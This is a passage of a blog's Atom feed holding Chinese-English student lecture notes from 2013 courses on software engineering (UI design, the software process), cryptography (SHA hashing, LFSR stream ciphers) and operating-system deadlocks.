直接看投影片裡面那九個吧  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;課後結語&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Review 的時間是有限的  &lt;/li&gt;
&lt;li&gt;透過 Metric 來衡量 Review 的效果，透過 Metric 的結果檢視並改善 Review 的方法  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Software Engineering"></category></entry><entry><title>ITSE Ch8 - Conventional Techniques of Design</title><link href="https://blog.m157q.tw/posts/2013/11/25/itse-ch8-conventional-techniques-of-design/" rel="alternate"></link><published>2013-11-25T01:21:00+08:00</published><updated>2013-11-25T01:21:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-11-25:posts/2013/11/25/itse-ch8-conventional-techniques-of-design/</id><summary type="html">&lt;h1&gt;NCTUCS 2013-Fall Introduction to Software Engineering by Professor Feng-Jian Wang&lt;/h1&gt;
&lt;h1&gt;Ch8 - Conventional Techniques of Design&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;ORB  &lt;/li&gt;
&lt;li&gt;Microsoft COM  &lt;/li&gt;
&lt;li&gt;Sun JavaBeans  &lt;/li&gt;
&lt;li&gt;Classification  &lt;ul&gt;
&lt;li&gt;Enumerated classification  &lt;/li&gt;
&lt;li&gt;Faceted classification  &lt;/li&gt;
&lt;li&gt;Attribute-value classification  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Indexing  &lt;/li&gt;
&lt;li&gt;The Reuse Environment  &lt;ul&gt;
&lt;li&gt;A component database capable of storing software components and the classification information necessary to retrieve them.  &lt;/li&gt;
&lt;li&gt;A library management system that provides access to the database.  &lt;/li&gt;
&lt;li&gt;A software component retrieval system (e.g., an object request broker) that enables a client application to retrieve components and services from the library server.  &lt;/li&gt;
&lt;li&gt;CBSE tools that support the integration of reused components into a new design or implementation.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;User Interface Design&lt;/h1&gt;
&lt;h2&gt;Typical Design Errors&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;lack of consistency  &lt;/li&gt;
&lt;li&gt;too much memorization  &lt;/li&gt;
&lt;li&gt;no guidance / help  &lt;/li&gt;
&lt;li&gt;no context sensitivity  &lt;/li&gt;
&lt;li&gt;poor response  &lt;/li&gt;
&lt;li&gt;Arcane/unfriendly  &lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Arcane adj. 晦澀難解的  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Golden Rules&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Place the user in control  &lt;/li&gt;
&lt;li&gt;Reduce the user’s memory load  &lt;/li&gt;
&lt;li&gt;Make the interface consistent  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Place the User in Control&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;not force a user into unnecessary or undesired actions  &lt;/li&gt;
&lt;li&gt;Provide flexible interaction  &lt;/li&gt;
&lt;li&gt;Allow user interaction to be interruptible and undoable. (undoable - impossible to achieve;)  &lt;/li&gt;
&lt;li&gt;Streamline interaction. ()  &lt;/li&gt;
&lt;li&gt;Allow the interaction to be customized.  &lt;/li&gt;
&lt;li&gt;Hide technical internals from the casual user.  &lt;/li&gt;
&lt;li&gt;Design for direct interaction with objects that appear on the screen.  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Reduce the User’s Memory Load&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Reduce demand on short-term memory.  &lt;/li&gt;
&lt;li&gt;Establish meaningful defaults.  &lt;/li&gt;
&lt;li&gt;Define shortcuts that are intuitive.  &lt;/li&gt;
&lt;li&gt;The visual layout of the interface should be based on a real world metaphor.  &lt;/li&gt;
&lt;li&gt;Disclose information in a progressive fashion.  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Make the Interface Consistent&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Allow the user to put the current task into a meaningful context.  &lt;/li&gt;
&lt;li&gt;Maintain consistency across a family of applications.  &lt;/li&gt;
&lt;li&gt;If past interactive models have created user expectations, do not make changes unless there is a compelling reason to do so.  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;User Interface Design Models&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;User model — a profile of all &lt;strong&gt;end users&lt;/strong&gt; of the system  &lt;/li&gt;
&lt;li&gt;Design model — a design realization of the user model  &lt;/li&gt;
&lt;li&gt;Mental model (system perception) — the user’s mental image of what the interface is  &lt;/li&gt;
&lt;li&gt;Implementation model — the interface &lt;strong&gt;“look and feel”&lt;/strong&gt; coupled with supporting information that describe interface syntax and semantics  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;User Interface Design Process&lt;/h2&gt;
&lt;p&gt;&lt;img alt="User Interface Design Process" src="/files/itse-ch8-conventional-techniques-of-design/user-interface-design-process.png" /&gt;  &lt;/p&gt;
&lt;h4&gt;Interface Analysis&lt;/h4&gt;
&lt;h4&gt;User Analysis&lt;/h4&gt;
&lt;h4&gt;Task Analysis and Modeling&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;find some workflow tools  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Analysis of Display Content&lt;/h4&gt;
&lt;h2&gt;Swimlane Diagram&lt;/h2&gt;
&lt;h2&gt;Interface Design Steps&lt;/h2&gt;
&lt;p&gt;￼￼￼￼￼￼1. define interface objects and actions (operations).&lt;br /&gt;
2. Define events (user actions)&lt;br /&gt;
3. Depict each interface state&lt;br /&gt;
4. Indicate how the user interprets the state of the system  &lt;/p&gt;
&lt;h2&gt;Design Issues&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Response time  &lt;/li&gt;
&lt;li&gt;Help facilities  &lt;/li&gt;
&lt;li&gt;Error handling  &lt;/li&gt;
&lt;li&gt;Menu and command labeling  &lt;/li&gt;
&lt;li&gt;Application accessibility  &lt;/li&gt;
&lt;li&gt;Internationalization  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;WebApp Interface Design&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Where am I?  &lt;ul&gt;
&lt;li&gt;provide an indication of the WebApp that has been accessed  &lt;/li&gt;
&lt;li&gt;inform the user of her location in the content hierarchy.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;What can I do now?&lt;br /&gt;
    The interface should always help the user understand his current options  &lt;ul&gt;
&lt;li&gt;what functions are available?  &lt;/li&gt;
&lt;li&gt;what links are live?  &lt;/li&gt;
&lt;li&gt;what content is relevant?  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Where have I been, where am I going?&lt;br /&gt;
    Theinterfacemust facilitate navigation.  &lt;ul&gt;
&lt;li&gt;Provide a “map” (implemented in a way that is easy to understand) of where the user has been and what paths may be taken to move elsewhere within the WebApp.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Effective WebApp Interfaces - by Bruce Tognozzi [TOG01]&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Effective interfaces are visually apparent and forgiving  &lt;/li&gt;
&lt;li&gt;Effective interfaces do not concern the user with the inner workings of the system.  &lt;/li&gt;
&lt;li&gt;Effective applications and services perform a maximum of work  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Interface Design Principles&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Anticipation （預期;期望): A WebApp should be designed so that it anticipates the use’s next move.  &lt;/li&gt;
&lt;li&gt;Communication  &lt;/li&gt;
&lt;li&gt;Consistency  &lt;/li&gt;
&lt;li&gt;Controlled autonomy  &lt;/li&gt;
&lt;li&gt;Efficiency  &lt;/li&gt;
&lt;li&gt;Focus  &lt;/li&gt;
&lt;li&gt;Fitt’s Law  &lt;/li&gt;
&lt;li&gt;Human interface objects  &lt;/li&gt;
&lt;li&gt;Latency reduction  &lt;/li&gt;
&lt;li&gt;Learnability  &lt;/li&gt;
&lt;li&gt;Maintain work product integrity  &lt;/li&gt;
&lt;li&gt;Readability  &lt;/li&gt;
&lt;li&gt;Track state  &lt;/li&gt;
&lt;li&gt;Visible navigation  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Interface Design Workflow&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Review information contained in the analysis model and refine as required.  &lt;/li&gt;
&lt;li&gt;Develop a rough sketch of the WebApp interface layout.  &lt;/li&gt;
&lt;li&gt;Map user objectives into specific interface actions.  &lt;/li&gt;
&lt;li&gt;Define a set of user tasks that are associated with each action.  &lt;/li&gt;
&lt;li&gt;Storyboard screen images for each interface action.  &lt;/li&gt;
&lt;li&gt;Refine interface layout and storyboards using input from aesthetic design.  &lt;/li&gt;
&lt;li&gt;Identify user interface objects that are required to implement the interface.  &lt;/li&gt;
&lt;li&gt;Develop a procedural representation of the user’s interaction with the interface.  &lt;/li&gt;
&lt;li&gt;Develop a behavioral representation of the interface.  &lt;/li&gt;
&lt;li&gt;Describe the interface layout for each state.  &lt;/li&gt;
&lt;li&gt;Refine and review the interface design model.  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Aesthetic Design&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Don’t be afraid of white space.  &lt;/li&gt;
&lt;li&gt;Emphasize content.  &lt;/li&gt;
&lt;li&gt;Organize layout elements from top-left to bottom right.  &lt;/li&gt;
&lt;li&gt;Group navigation, content, and function geographically within the page.  &lt;/li&gt;
&lt;li&gt;Don’t extend your real estate with the scrolling bar. (?  &lt;/li&gt;
&lt;li&gt;Consider resolution and browser window size when designing layout. =&amp;gt; Response Design  &lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Design Evaluation Cycle&lt;/h1&gt;
&lt;p&gt;&lt;img alt="design evaluation cycle" src="/files/itse-ch8-conventional-techniques-of-design/design-evaluation-cycle.png" /&gt;  &lt;/p&gt;</summary><category term="Software Engineering"></category></entry><entry><title>ITC week9 - Hash</title><link href="https://blog.m157q.tw/posts/2013/11/22/itc-week9-hash/" rel="alternate"></link><published>2013-11-22T07:43:00+08:00</published><updated>2013-11-22T07:43:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-11-22:posts/2013/11/22/itc-week9-hash/</id><summary type="html">&lt;h2&gt;NCTUCS 2013-Fall Introduction to Cryptography by Professor Rong-Jaye Chen.&lt;/h2&gt;
&lt;p&gt;SHA 系列的比較表&lt;br /&gt;
&lt;img alt="SHA series" src="/files/itc-week9-hash/sha-series.jpg" /&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Hash 一定要夠快而且夠亂 才不容易被破解  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;img alt="General Structure of Secure Hash Code" src="/files/itc-week9-hash/general-structure-of-secure-hash-code.png" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;compression function&lt;/h3&gt;
&lt;p&gt;一個 Block 1024 bits 加 SHA-512 出來的 512 bits，出來就會變成原本的三倍  &lt;/p&gt;
&lt;hr /&gt;
&lt;blockquote&gt;
&lt;p&gt;Birthday attack 只要 2^32 就可以找到一個 collision  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;W0~W79 共 80 個 Rounds  &lt;/li&gt;
&lt;li&gt;2012 年 SHA-3 問世  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Cryptography"></category><category term="Security"></category></entry><entry><title>ITSE Ch1 - Software and Software Engineering</title><link href="https://blog.m157q.tw/posts/2013/11/20/itse-ch1-software-and-software-engineering/" rel="alternate"></link><published>2013-11-20T17:57:00+08:00</published><updated>2013-11-20T17:57:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-11-20:posts/2013/11/20/itse-ch1-software-and-software-engineering/</id><summary type="html">&lt;h1&gt;NCTUCS 2013-Fall Introduction to Software Engineering by Professor Feng-Jian Wang&lt;/h1&gt;
&lt;h1&gt;Ch1 - Software &amp;amp; Software Engineering&lt;/h1&gt;
&lt;h2&gt;Software—New Categories&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Open world computing—pervasive, distributed computing  &lt;/li&gt;
&lt;li&gt;Ubiquitous computing—wireless networks  &lt;/li&gt;
&lt;li&gt;Netsourcing(cloud)—the Web as a computing engine  &lt;/li&gt;
&lt;li&gt;Open source—”free” source code open to the computing community (a blessing, but also a potential curse!)  &lt;/li&gt;
&lt;li&gt;Data mining  &lt;/li&gt;
&lt;li&gt;Grid computing  &lt;/li&gt;
&lt;li&gt;Cognitive machines  &lt;/li&gt;
&lt;li&gt;Software for nanotechnologies  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;The Software Process&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;A &lt;strong&gt;process&lt;/strong&gt; is a collection of activities, actions, and tasks that are performed when some work product is to be created.  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;An &lt;strong&gt;activity&lt;/strong&gt; strives to achieve a broad objective (e.g., communication with stakeholders) and is applied regardless of the application domain, size of the project, complexity of the effort, or degree of rigor with which software engineering is to be applied.  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;An &lt;strong&gt;action&lt;/strong&gt; (e.g., architectural design) encompasses a set of tasks that produce a major work product (e.g., an architectural design model).  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;A &lt;strong&gt;task&lt;/strong&gt; focuses on a small, but well-defined objective (e.g., conducting a unit test) that produces a tangible outcome.  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;A &lt;strong&gt;process framework&lt;/strong&gt; establishes the foundation for a complete software engineering process by identifying a small number of &lt;strong&gt;framework activities&lt;/strong&gt; that are applicable to all software projects, regardless of their size or complexity. In addition, the process framework encompasses a set of &lt;strong&gt;umbrella activities&lt;/strong&gt; that are applicable across the entire software process.  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;A generic process framework for software engineering encompasses five activities:  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Communication  &lt;ul&gt;
&lt;li&gt;Before any technical work can commence, it is critically important to communicate and collaborate with the customer and other stakeholders.  &lt;/li&gt;
&lt;li&gt;The intent is to understand stakeholders’ objectives for the project and to gather requirements that help define software features and functions.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Planning  &lt;ul&gt;
&lt;li&gt;The planning activity creates a “map” that helps guide the team as it makes the journey.  &lt;/li&gt;
&lt;li&gt;The map—called a software project plan defines the software engineering work by describing the technical tasks to be conducted, the risks that are likely, the resources that will be required, the work products to be produced, and a work schedule.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Modeling  &lt;ul&gt;
&lt;li&gt;You create a “sketch” of the thing so that you’ll understand the big picture what it will look like architecturally, how the constituent parts fit together, and many other characteristics.  &lt;/li&gt;
&lt;li&gt;If required, you refine the sketch into greater and greater detail in an effort to better understand the problem and how you’re going to solve it.  &lt;/li&gt;
&lt;li&gt;A software engineer does the same thing by creating models to better understand software requirements and the design that will achieve those requirements.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Construction  &lt;ul&gt;
&lt;li&gt;This activity combines code generation (either manual or automated) and the testing that is required to uncover errors in the code.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Deployment  &lt;ul&gt;
&lt;li&gt;The software (as a complete entity or as a partially completed increment) is delivered to the customer who evaluates the delivered product and provides feedback based on the evaluation.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;These five generic framework activities can be used during the development of small, simple programs, the creation of large Web applications, and for the engineering of large, complex computer-based systems.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2&gt;Umbrella activities&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Software engineering process framework activities are complemented by a number of umbrella activities. In general, umbrella activities are applied throughout a software project and help a software team manage and control progress, quality, change, and risk. Typical umbrella activities include:  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Software project tracking and control&lt;/strong&gt; — allows the software team to assess progress against the project plan and take any necessary action to maintain the schedule.  &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Risk management&lt;/strong&gt; — assesses risks that may affect the outcome of the project or the quality of the product.  &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Software quality assurance&lt;/strong&gt; — defines and conducts the activities required to ensure software quality.  &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Technical reviews&lt;/strong&gt; — assesses software engineering work products in an effort to uncover and remove errors before they are propagated to the next activity.  &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Measurement&lt;/strong&gt; — defines and collects process, project, and product measures that assist the team in delivering software that meets stakeholders’ needs; can be used in conjunction with all other framework and umbrella activities.  &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Software configuration management&lt;/strong&gt; — manages the effects of change throughout the software process.  &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Reusability management&lt;/strong&gt; — defines criteria for work product reuse (including software components) and establishes mechanisms to achieve reusable components.  &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Work product preparation and production&lt;/strong&gt; — encompasses the activities required to create work products such as models, documents, logs, forms, and lists.  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Hooker’s General Principles&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;The Reason It All Exists  &lt;/li&gt;
&lt;li&gt;KISS (Keep It Simple, Stupid!)  &lt;/li&gt;
&lt;li&gt;Maintain the Vision  &lt;/li&gt;
&lt;li&gt;What You Produce, Others Will Consume  &lt;/li&gt;
&lt;li&gt;Be Open to the Future  &lt;/li&gt;
&lt;li&gt;Plan Ahead for Reuse  &lt;/li&gt;
&lt;li&gt;Think!  &lt;/li&gt;
&lt;/ol&gt;</summary><category term="Software Engineering"></category></entry><entry><title>ITC week8 - LFSR-based Stream Cipher</title><link href="https://blog.m157q.tw/posts/2013/11/20/itc-week8-lfsr-based-stream-cipher/" rel="alternate"></link><published>2013-11-20T04:00:00+08:00</published><updated>2013-11-20T04:00:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-11-20:posts/2013/11/20/itc-week8-lfsr-based-stream-cipher/</id><summary type="html">&lt;h1&gt;NCTUCS 2013-Fall Introduction to Cryptography by Professor Rong-Jaye Chen.&lt;/h1&gt;
&lt;h1&gt;LFSR == Linear Feedback Shift Register&lt;/h1&gt;
&lt;h2&gt;FSR&lt;/h2&gt;
&lt;p&gt;Feedback shift register&lt;br /&gt;
&lt;img alt="FSR" src="/files/itc-week8-lfsr-based-stream-cipher/fsr.jpg" /&gt;&lt;br /&gt;
&lt;strong&gt;connection polynomial:&lt;/strong&gt;  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;C(x) = 1 + C_{1}x + C_{2}x^{2} + \cdots + C_{L}x^{L}  
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;LFSR&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;If the feedback function is linear, the FSR is called LFSR  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;i.e.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;S_{L} = C_{1}S_{L-1} + C_{2}S_{L-2} + \cdots + C_{L}S_0{}  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;is linear.  &lt;/p&gt;
&lt;hr /&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;\begin{align}  

&amp;amp; \text{If } C(x) \text{ is primitive and the initial state } \\  
&amp;amp; (S_{0}, S_{1}, \cdots , S_{L-1}) \text{ is not zero, } \text{the period is } 2^{L} - 1  

\end{align}  
&lt;/pre&gt;&lt;/div&gt;


&lt;blockquote&gt;
&lt;p&gt;A stream cipher constructed by a LFSR alone is not secure.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2&gt;Nonlinear combination generators&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Geff Generator (1973)  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Nonlinear filter generators&lt;/h2&gt;
&lt;h2&gt;Clcok-controlled generators&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Stop-and-Go Generators (1987)  &lt;/li&gt;
&lt;li&gt;The Shrinking Generator (1993)  &lt;/li&gt;
&lt;li&gt;A5 (the GSM standard)  &lt;/li&gt;
&lt;li&gt;E0 (Bluetooth's standard encryption)  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;GSM A5/1&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://en.wikipedia.org/wiki/A5/1"&gt;wikipedia - A5/1&lt;/a&gt;&lt;br /&gt;
&lt;a href="https://www.youtube.com/watch?v=LgZAI3DdUA4"&gt;Animation of A5/1 cipher&lt;/a&gt;  &lt;/p&gt;</summary><category term="Cryptography"></category><category term="InfoSec"></category><category term="Security"></category></entry><entry><title>OS Ch7 - Deadlocks</title><link href="https://blog.m157q.tw/posts/2013/11/19/os-ch7-deadlocks/" rel="alternate"></link><published>2013-11-19T02:40:00+08:00</published><updated>2013-11-19T02:40:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-11-19:posts/2013/11/19/os-ch7-deadlocks/</id><summary type="html">&lt;h1&gt;OS == Operating System&lt;/h1&gt;
&lt;h1&gt;Ch7 - Deadlocks&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Prevent sets of concurrent processes from completing their tasks.  &lt;/li&gt;
&lt;li&gt;To present a number of different methods for preventing or avoiding deadlocks in a computer system.  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;The Deadlock Problem&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;A set of blocked processes each holding a resource and waiting to acquire a resource held by another process in the set.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4&gt;Bridge Crossing Example&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Most OSes do not prevent or deal with deadlocks  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;System Model&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Resource types R1, R2, . . ., Rm&lt;br /&gt;
    CPU cycles, memory space, I/O devices  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Each resource type Ri has Wi instances.  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Each process utilizes a resource as follows:  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;request  &lt;/li&gt;
&lt;li&gt;use  &lt;/li&gt;
&lt;li&gt;release  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Deadlock Characterization&lt;/h2&gt;
&lt;p&gt;&lt;img alt="Deadlock Characterization" src="/files/os-ch7-deadlocks/deadlock-characterization.jpg" /&gt;  &lt;/p&gt;
&lt;h3&gt;Resource-Allocation Graph&lt;/h3&gt;
&lt;p&gt;&lt;img alt="Resource-Allocation Graph 1" src="/files/os-ch7-deadlocks/resource-allocation-graph-1.jpg" /&gt;&lt;br /&gt;
&lt;img alt="Resource-Allocation Graph 2" src="/files/os-ch7-deadlocks/resource-allocation-graph-2.jpg" /&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Resource Allocation Graph With A Deadlock&lt;br /&gt;
&lt;img alt="Resource Allocation Graph With A Deadlock" src="/files/os-ch7-deadlocks/resource-allocation-graph-with-a-deadlock.jpg" /&gt;  &lt;/li&gt;
&lt;li&gt;Resource Allocation Graph With A Cycle But No Deadlock&lt;br /&gt;
&lt;img alt="Resource Allocation Graph With A Cycle But No Deadlock" src="/files/os-ch7-deadlocks/resource-allocation-graph-with-a-cycle-but-no-deadlock.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Basic Facts&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;If graph contains no cycles =&amp;gt; no deadlock  &lt;/li&gt;
&lt;li&gt;If graph contains a cycle =&amp;gt;  &lt;ul&gt;
&lt;li&gt;if only one instance per resource type, then deadlock  &lt;/li&gt;
&lt;li&gt;if several instances per resource type, possibility of deadlock  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Methods for Handling Deadlocks&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Ensure that the system will never enter a deadlock state  &lt;/li&gt;
&lt;li&gt;Allow the system to enter a deadlock state and then recover  &lt;/li&gt;
&lt;li&gt;Ignore the problem and pretend that deadlocks never occur in the system; used by most operating systems, including UNIX  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Deadlock Prevention&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Mutual Exclusion&lt;/strong&gt; - not required for sharable resources; must hold for nonsharable resources  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Hold and Wait&lt;/strong&gt; - must guarantee that whenever a process requests a resource, it does not hold any other resources  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Require process to request and be allocated all its resources before it begins execution&lt;/strong&gt;  &lt;/li&gt;
&lt;li&gt;Allow process to request resources only when the process has none  &lt;/li&gt;
&lt;li&gt;Low resource utilization  &lt;/li&gt;
&lt;li&gt;Starvation possible  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;No Preemption&lt;/strong&gt; (preemption - 先發制人)  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;某個 process 用完 resources 後，一定要該 process 自願釋出 resources ，不能強制奪取其 resources.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;If a process that is holding some resources requests another resource that cannot be immediately allocated to it, then all resources currently being held are released&lt;/strong&gt;  &lt;/li&gt;
&lt;li&gt;Preempted resources are added to the list of resources for which the process is waiting  &lt;/li&gt;
&lt;li&gt;Process will be restarted only when it can regain its old resources, as well as the new ones that it is requesting  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Circular Wait&lt;/strong&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;impose a total ordering of all resource types =&amp;gt; 可能非常非常的多  &lt;/li&gt;
&lt;li&gt;require that each process requests resources in an &lt;strong&gt;increasing order of enumeration&lt;/strong&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Deadlock prevention by resource ordering&lt;/strong&gt; - Linux kernel 3.6.7 use this method.&lt;br /&gt;
&lt;img alt="double_rq_lock" src="/files/os-ch7-deadlocks/double-rq-lock.png" /&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;當你可能需要把某個 process 從一個 core 移到另一個 core (作 Load balance) 的時候，兩邊的 core 都要使用 lock 。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;All resources will be requested in order. =&amp;gt; &lt;strong&gt;total ordering&lt;/strong&gt;  &lt;/li&gt;
&lt;li&gt;No two resources unrelated by order will ever be used by a single unit of work at the same time.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Deadlock Avoidance&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Simplest and most useful model requires that each process declare the maximum number of resources of each type that it may need  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The deadlock-avoidance algorithm dynamically examines the resource-allocation state to ensure that there can never be a circular-wait condition  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Resource-allocation state is defined by the number of available and allocated resources, and the maximum demands of the processes  &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Safe State&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;When a process requests an available resource, &lt;strong&gt;system must decide if immediate allocation leaves the system in a safe state&lt;/strong&gt;.  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;\begin{align}  

&amp;amp; \text{ System is in safe state if there exists a sequence } \langle P_{1}, P_{2}, \cdots, P_{n} \rangle \\  
&amp;amp; \text{ of ALL the processes in the systems such that for each } P_{i} \\  
&amp;amp; \text{ , the resources that } P_{i} \text{ can still request can be satisfied } \\  
&amp;amp; \text{ by currently available resources + resources held by all the } P_{j}, \text{ with } j &amp;lt; i \\  

\end{align}  
&lt;/pre&gt;&lt;/div&gt;


